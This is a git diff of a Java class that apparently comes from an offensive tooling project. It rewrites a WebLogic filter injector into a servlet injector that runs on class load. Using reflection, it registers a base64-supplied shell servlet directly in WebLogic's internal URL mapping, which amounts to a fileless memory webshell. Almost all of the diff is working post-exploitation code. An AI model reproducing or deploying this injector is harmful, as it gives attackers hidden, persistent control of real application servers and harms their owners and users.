@@ -1,21 +1,26 @@
 package com.reajason.javaweb.memshell.weblogic.injector;
 
+import javax.servlet.Servlet;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.lang.reflect.Array;
+import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
-import java.util.*;
+import java.util.Arrays;
+import java.util.HashSet;
+import java.util.Map;
+import java.util.Set;
 import java.util.zip.GZIPInputStream;
 
 /**
  * @author ReaJason
  */
-public class WebLogicFilterInjector {
+public class WebLogicServletInjector {
 
     static {
-        new WebLogicFilterInjector();
+        new WebLogicServletInjector();
     }
 
     public String getUrlPattern() {
@@ -30,12 +35,12 @@ public class WebLogicFilterInjector {
         return "{{base64Str}}";
     }
 
-    public WebLogicFilterInjector() {
+    public WebLogicServletInjector() {
         try {
             Object[] contexts = getContext();
             for (Object context : contexts) {
-                Object filter = getShell(context);
-                inject(context, filter);
+                Object servlet = getShell(context);
+                inject(context, servlet);
             }
         } catch (Exception e) {
             e.printStackTrace();
@@ -152,30 +157,37 @@ public class WebLogicFilterInjector {
         return obj;
     }
 
-    @SuppressWarnings("unchecked")
-    public void inject(Object context, Object filter) throws Exception {
-        if (isInjected(context)) {
-            return;
+    /**
+     * server/lib/weblogic.jar
+     * weblogic.servlet.internal.WebAppServletContext
+     */
+    public void inject(Object context, Object servlet) throws Exception {
+        // weblogic.servlet.utils.URLMapping
+        Object servletMapping = invokeMethod(context, "getServletMapping", null, null);
+        Class<?> webAppServletContextClass = Class.forName("weblogic.servlet.internal.WebAppServletContext");
+        Class<?> servletStubImplClass = Class.forName("weblogic.servlet.internal.ServletStubImpl");
+        Object servletStub = null;
+        Constructor<?> servletStubImplConstructor = null;
+        try {
+            servletStubImplConstructor = servletStubImplClass.getDeclaredConstructor(String.class, Servlet.class, webAppServletContextClass);
+            servletStubImplConstructor.setAccessible(true);
+            servletStub = servletStubImplConstructor.newInstance(getClassName(), servlet, context);
+        } catch (NoSuchMethodException e) {
+            // 10.3.6
+            servletStubImplConstructor = servletStubImplClass.getDeclaredConstructor(String.class, String.class, webAppServletContextClass, Map.class);
+            servletStubImplConstructor.setAccessible(true);
+            servletStub = servletStubImplConstructor.newInstance(getClassName(), getClassName(), context, null);
         }
-        Object filterManager = invokeMethod(context, "getFilterManager", null, null);
-        Object servletClassLoader = invokeMethod(context, "getServletClassLoader", null, null);
-        Map<String, Class<?>> cachedClasses = (Map<String, Class<?>>) getFieldValue(servletClassLoader, "cachedClasses");
-        cachedClasses.put(getClassName(), filter.getClass());
-        invokeMethod(filterManager, "registerFilter", new Class[]{String.class, String.class, String[].class, String[].class, Map.class, String[].class}, new Object[]{getClassName(), getClassName(), new String[]{getUrlPattern()}, null, null, new String[]{"REQUEST", "FORWARD", "INCLUDE", "ERROR"}});
-        List<Object> filterPatternList = (List<Object>) getFieldValue(filterManager, "filterPatternList");
-        Object currentMapping = filterPatternList.remove(filterPatternList.size() - 1);
-        filterPatternList.add(0, currentMapping);
-    }
-
-    @SuppressWarnings("all")
-    public boolean isInjected(Object context) throws Exception {
-        Map filters = (Map) getFieldValue(getFieldValue(context, "filterManager"), "filters");
-        for (Object obj : filters.keySet()) {
-            if (obj.toString().contains(getClassName())) {
-                return true;
-            }
+        Constructor<?> urlMatchHelperConstructor = Class.forName("weblogic.servlet.internal.URLMatchHelper").getDeclaredConstructor(String.class, servletStubImplClass);
+        urlMatchHelperConstructor.setAccessible(true);
+        Object urlMatchHelper = urlMatchHelperConstructor.newInstance(getUrlPattern(), servletStub);
+        Object mapping = invokeMethod(servletMapping, "get", new Class[]{String.class}, new Object[]{getUrlPattern()});
+        if (mapping == null) {
+            invokeMethod(servletMapping, "put", new Class[]{String.class, Object.class}, new Object[]{getUrlPattern(), urlMatchHelper});
+            System.out.println("servlet inject successful");
+        } else {
+            System.out.println("servlet already injected");
         }
-        return false;
     }
 
     @SuppressWarnings("all")
@@ -215,38 +227,16 @@ public class WebLogicFilterInjector {
         return out.toByteArray();
     }
 
-    @SuppressWarnings("all")
-    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) {
-        try {
-            Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
-            Method method = null;
-            while (clazz != null && method == null) {
-                try {
-                    if (paramClazz == null) {
-                        method = clazz.getDeclaredMethod(methodName);
-                    } else {
-                        method = clazz.getDeclaredMethod(methodName, paramClazz);
-                    }
-                } catch (NoSuchMethodException e) {
-                    clazz = clazz.getSuperclass();
-                }
-            }
-            if (method == null) {
-                throw new NoSuchMethodException("Method not found: " + methodName);
-            }
-
-            method.setAccessible(true);
-            return method.invoke(obj instanceof Class ? null : obj, param);
-        } catch (Exception e) {
-            throw new RuntimeException("Error invoking method: " + methodName, e);
-        }
+    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
+        Class<?> clazz = obj.getClass();
+        Method method = clazz.getDeclaredMethod(methodName, paramClazz);
+        method.setAccessible(true);
+        return method.invoke(obj, param);
     }
 
     @SuppressWarnings("all")
     public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
-        for (Class<?> clazz = obj.getClass();
-             clazz != Object.class;
-             clazz = clazz.getSuperclass()) {
+        for (Class<?> clazz = obj.getClass(); clazz != Object.class; clazz = clazz.getSuperclass()) {
             try {
                 Field field = clazz.getDeclaredField(name);
                 field.setAccessible(true);
